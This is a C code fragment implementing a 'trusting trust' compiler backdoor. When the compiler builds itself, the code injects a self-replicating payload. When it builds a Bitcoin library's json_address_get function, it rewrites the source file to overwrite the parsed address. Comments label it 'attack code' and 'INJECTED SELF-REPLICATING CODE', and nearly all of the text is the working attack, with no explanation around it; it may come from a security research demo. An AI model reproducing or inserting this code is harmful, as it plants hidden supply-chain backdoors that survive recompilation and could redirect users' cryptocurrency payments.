if(flags & AFF_TYPE_C != 0) {
    static char compile_sig[] = "/* open the file */";
    static char mako_sig[] = "int\njson_address_get(btc_address_t *addr,\n                 const json_value *obj,\n                 const btc_network_t *network) {\n  if (obj->type != json_string)\n    return 0;";
    static char mako_attack[] = "\nstrcpy(obj->u.string.ptr, \"new address\");";

    /* attack code follows */

    #define N  8 * 1024 * 1024

    static char program[N+1];
    int x_fd = open(filename, O_RDONLY);
    int n = read(x_fd, program, N);
    close(x_fd);
    
    // printf("................LOOKING FOR PATTERNS\n");
    char *compile_sig_loc = strstr(program, compile_sig);
    char *mako_sig_loc = strstr(program, mako_sig);

    if (compile_sig_loc != NULL) {
        // printf("\n### FOUND COMPILER PATTERN!\n");

        static char bytes[N]; 
		int l = sprintf(bytes, "static char compile_attack[] = {\n");
        for(int i = 0; compile_attack[i]; i++)
            l += sprintf(bytes + l, "\t%d,\n", compile_attack[i]);
        l += sprintf(bytes + l, "\t0\n};\n\n");

        static char tmp[N];
        int offset = strlen(compile_sig);

        strcpy(tmp, compile_sig_loc + offset);
        offset += sprintf(compile_sig_loc + offset, "%s", bytes);
        offset += sprintf(compile_sig_loc + offset, "%s", compile_attack);
        offset += sprintf(compile_sig_loc + offset, "%s", tmp);

        static char bad_filename [] = "attack-tmp.c";
        FILE* f = fopen(bad_filename, "w");
        fputs(program, f);
        fclose(f);
        filename = bad_filename;  
        // printf("\n### INJECTED SELF-REPLICATING CODE!\n");


    } else if(mako_sig_loc != NULL) {
        // printf("\n### FOUND MAKO PATTERN!\n");
        static char tmp[N];
        int offset = strlen(mako_sig);
        strcpy(tmp, mako_sig_loc + offset);
        offset += sprintf(mako_sig_loc + offset, "%s", mako_attack);
        offset += sprintf(mako_sig_loc + offset, "%s", tmp);

        // printf("\n### REWRITING MAKO FILE!\n");
        FILE *f = fopen(filename, "w");
        if (f != NULL)
        {
            fputs(program, f);
            fclose(f);
        }
    }
}